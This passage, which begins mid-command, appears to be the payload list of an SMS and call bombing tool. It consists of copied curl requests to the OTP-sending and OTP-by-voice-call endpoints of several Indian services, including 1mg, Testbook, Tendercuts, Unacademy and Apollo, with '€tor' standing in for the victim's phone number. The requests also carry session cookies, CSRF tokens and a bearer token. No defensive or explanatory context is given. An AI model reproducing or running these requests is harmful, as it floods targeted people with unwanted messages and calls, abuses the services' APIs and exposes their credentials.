AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.890613511.1676729832; _gid=GA1.2.976323208.1676729833; _dc_gtm_UA-21820217-6=1; _gat_UA-21820217-6=1; outbrain_cid_fetch=true; shw_13453=1; _nv_banner_x=13453; _nv_hit=173339004.1676729983.cHZpZXc9MXxidmlldz1bIjEzNDUzIl0=; rl_session=RudderEncrypt%3AU2FsdGVkX1%2FVC3m%2FmoqzX17bt9B%2Fc0bmbo82X7X5Lc%2Bfb%2BjGRJRrdFf7OF6hkZaU%2FE60GEATjhBeZclfs9LQKGHWIgdNiociVoDP1l7dHwb%2BTe7rpO3FrGk%2B6oWN%2BVoHXxRxm1%2BNzUWiFi3zOpPG9Q%3D%3D; AWSALBTG=Z/Cvr1JO8zVmPLKL6jkvDltFGYqygKonwBiXLDFNhqiFK9jbIemlamkXahjAVa1rVSiiysuuSUTwetABAhdN8H8kLRWKwce24pTdK8dMNeeY7Q7T0S+4UzPXEG+wDI47guvLcrpYn2KDySepzaAwKq/3/kKIn9q+A3oP3j1LA1fT; AWSALBTGCORS=Z/Cvr1JO8zVmPLKL6jkvDltFGYqygKonwBiXLDFNhqiFK9jbIemlamkXahjAVa1rVSiiysuuSUTwetABAhdN8H8kLRWKwce24pTdK8dMNeeY7Q7T0S+4UzPXEG+wDI47guvLcrpYn2KDySepzaAwKq/3/kKIn9q+A3oP3j1LA1fT' \
  -H 'hkp-platform: Healthkartplus-0.0.1-Desktop' \
  -H 'origin: https://www.1mg.com' \
  -H 'pragma: no-cache' \
  -H 'referer: https://www.1mg.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'visitor-id: c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979' \
  -H 'x-csrf-token: qsV9AIy4-C0GI9ppMcea042GtPQ8WRA6AhlE' \
  -H 'x-html-canrender: True' \
  -H 'x-platform: Desktop-0.0.1' \
  --data-raw '{"number":"€tor","is_corporate_user":false,"is_doctor":false}' \
  --compressed


curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&resend=true' \
  -H 'authority: api.testbook.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://testbook.com' \
  -H 'referer: https://testbook.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
  -H 'x-tb-client: web,1.2' \
  --data-raw '{}' \
  --compressed

curl 'https://api.tendercuts.in/otp/v2/generate/' \
  -H 'authority: api.tendercuts.in' \
  -H 'accept: application/json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.tendercuts.in' \
  -H 'referer: https://www.tendercuts.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"mobile":"€tor","otp_mode":"SIGNUP"}' \
  --compressed




#ll..



curl 'https://api.tendercuts.in/otp/retry/' \
  -H 'authority: api.tendercuts.in' \
  -H 'accept: application/json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.tendercuts.in' \
  -H 'referer: https://www.tendercuts.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"mobile":"€tor","retry_mode":"voice","gateway":null}' \
  --compressed

curl 'https://www.1mg.com/auth_api/v6/create_token' \
  -H 'authority: www.1mg.com' \
  -H 'accept: application/vnd.healthkartplus.v11+json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: no-cache, no-store, must-revalidate' \
  -H 'content-type: application/json' \
  -H 'cookie: VISITOR-ID=c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979; city=New%20Delhi; abVisitorId=939604; abExperimentShow=false; amoSessionId=34b0afff-b37b-4a23-bedc-b7c34f31585b; _csrf=AKH-us7dH8ukhnXxYddFxMWZ; isLocaleRedirect=false; isLocaleUIChange=false; _fbp=fb.1.1676729831196.2102042321; geolocation=false; session=r0At4uZPUY5KBP9z6oUE9g.HA9GWOAOjYmT0cW7sZaXEhSjNTb1lL41XKlBCewyOKRWlQySDPiHyAaeLFnMlcJZCdD6SoOU26xSUa2_2uTEfm__O-pT2Uii7ZM42LKWHWrdxvhKnd6MThYVg_8l0KvAykGQAwYt975e5Vk0WSIimg.1676729982547.144000000.0adMxuts723a2dhqUDZGfsJ-8K_iEXc6JT3KW1RxMG4; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2FStNdMwED%2BTTV06nDuNVSN5D9n4kk1GEM%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19IBDFLZ9nEAjLNyMBHx%2FyetdQqTST8GcM%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FL%2FJFdNiK5YUutpw0MxOKaIDO1h97n7zk1V%2FJNVf2t8k44kCyEiFov02inrpzQjyeFDbO1VI1scA%3D%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2BfrS%2F1Yq%2BZHCBtJvR9sz4E7nyrWmSfPDKXHrPGCDl%2B9vZI9xcd6FZe; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18x3ztMsZrphb9%2FGq7adtf3%2BnqRhFkOY%2B5aDvSOGj81z4G5WiZXOxCx; rl_user_id=RudderEncrypt%3AU2FsdGVkX19tl15uVdl2F4HTtLqxkVYX5vVc13JJMRGsvBoqQDncUbQDp4lImDK6ng36A0qEasZXD4fsG1roJBtF%2Bu97PxBaE2eHI2hdoGA%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX188%2BNRgVCrrioB2gso0chWwimiNCqv0acq9ZLzFkz2xRjIHAUruKYqloccZeJCOBlY04Fy1p8V9Iw%3D%3D; _uetsid=ef875af0af9611edbd12a720bc1ea225; _uetvid=ef87d4f0af9611ed995c477ccb56e9bb; _gcl_au=1.1.929593392.1676729832; _nv_sess=173339004.1676729983.9qooi8THZDgNOGZnK3IPdwynyi1Mm4kQtfLfQ3S4Xcg7kv8fpE; _nv_uid=173339004.1676729983.3ffe3c1c-7be0-41ad-855d-54d9c1821d4b.1676729983.1676729983.1.0; _nv_utm=173339004.1676729983.1.1.dXRtc3JjPWdvb2dsZXx1dG1jY249KG5vdCBzZXQpfHV0bWNtZD1vcmdhbmljfHV0bWN0cj0obm90IHByb3ZpZGVkKXx1dG1jY3Q9KG5vdCBzZXQpfGdjbGlkPShub3Qgc2V0KQ==; _nv_did=173339004.1676729983.10318094147tavoi; _ga_1HF6RR2VT7=GS1.1.1676729832.1.0.1676729832.0.0.0; _ga_NPGHGVF7FB=GS1.1.1676729832.1.0.1676729832.0.0.0; singular_device_id=523e24ec-85ce-4cc5-8a1d-f053dc51eb6a; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.890613511.1676729832; _gid=GA1.2.976323208.1676729833; outbrain_cid_fetch=true; shw_13453=1; _nv_banner_x=13453; _nv_hit=173339004.1676729983.cHZpZXc9MXxidmlldz1bIjEzNDUzIl0=; AWSALBTG=DfsUbEZSlDPrsDYNT67nas897cRWx5/OVAOTdbqmdkLZtCY+2LbrDf+NEyc+CLy89gFBr5xJEfeTgAfBh75i2d8Z5RkUlEqkahbKSXC3qZzMQ+G7Npnww1qSvvMCuQKEwoUzdnXjRw+Ve4v/Js3XhY+S5a9BRyxYwfM6k965C5gJ; AWSALBTGCORS=DfsUbEZSlDPrsDYNT67nas897cRWx5/OVAOTdbqmdkLZtCY+2LbrDf+NEyc+CLy89gFBr5xJEfeTgAfBh75i2d8Z5RkUlEqkahbKSXC3qZzMQ+G7Npnww1qSvvMCuQKEwoUzdnXjRw+Ve4v/Js3XhY+S5a9BRyxYwfM6k965C5gJ; rl_session=RudderEncrypt%3AU2FsdGVkX19k1sKjNkmJ0%2BE2UJNIxhxyg8AG53dzSaIKZi0oI2Gl6DNxg66M5CAzF6LA1o3FmnDKyNgn5AwoTJVjE%2FTWnmtLhtj0Ysr2z%2B%2Bsf%2FSbHvSYHd3VJevNHij9AuM4Slxl388yg2%2BHHb82VA%3D%3D' \
  -H 'hkp-platform: Healthkartplus-0.0.1-Desktop' \
  -H 'origin: https://www.1mg.com' \
  -H 'pragma: no-cache' \
  -H 'referer: https://www.1mg.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'visitor-id: c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979' \
  -H 'x-csrf-token: qsV9AIy4-C0GI9ppMcea042GtPQ8WRA6AhlE' \
  -H 'x-html-canrender: True' \
  -H 'x-platform: Desktop-0.0.1' \
  --data-raw '{"number":"€tor","is_corporate_user":false,"otp_on_call":true}' \
  --compressed


curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&otpSentVia=call&resend=true' \
  -H 'authority: api.testbook.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://testbook.com' \
  -H 'referer: https://testbook.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
  -H 'x-tb-client: web,1.2' \
  --data-raw '{}' \
  --compressed

curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
  -H 'authority: unacademy.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: isDarkModeOn=; proxy-user-uid=856546e5_d94d_4c92_b2ea_50601b466977; un_session_id=738747f0_073b_4eb6_b3b7_5f1fbb258522; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; anonymous_session_id=aeaeefcf_bd1f_46e6_848d_0eea5f87a8f8; _gcl_au=1.1.721686470.1676749491; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.1865436011.1676749491; _ga=GA1.2.387904297.1676749491; _fbp=fb.1.1676749491677.513529990; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; _ga_6JX23YC5TQ=GS1.1.1676749491.1.1.1676749507.0.0.0; _uetsid=b7bec9f0afc411edb8fcf3e5b0242a00; _uetvid=bd557650d54211ecab6383e5aece31d2' \
  -H 'origin: https://unacademy.com' \
  -H 'referer: https://unacademy.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-platform: 0' \
  --data-raw '{"phone":"€tor","country_code":"IN","otp_type":2,"email":"","send_otp":true,"is_un_teach_user":false}' \
  --compressed

curl 'https://webapi.apollo247.com/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Origin: https://www.apollopharmacy.in' \
  -H 'Referer: https://www.apollopharmacy.in/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'accept: */*' \
  -H 'authorization: Bearer 3d1833da7020e0602165529446587434' \
  -H 'content-type: application/json' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw $'{"operationName":"getOTPOnCall","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT","id":"0c3f4d50-b054-11ed-9846-7b73ab120606"},"query":"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String\u0021) {\\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\\n    status\\n    loginId\\n    message\\n    __typename\\n  }\\n}\\n"}' \
  --compressed


#.
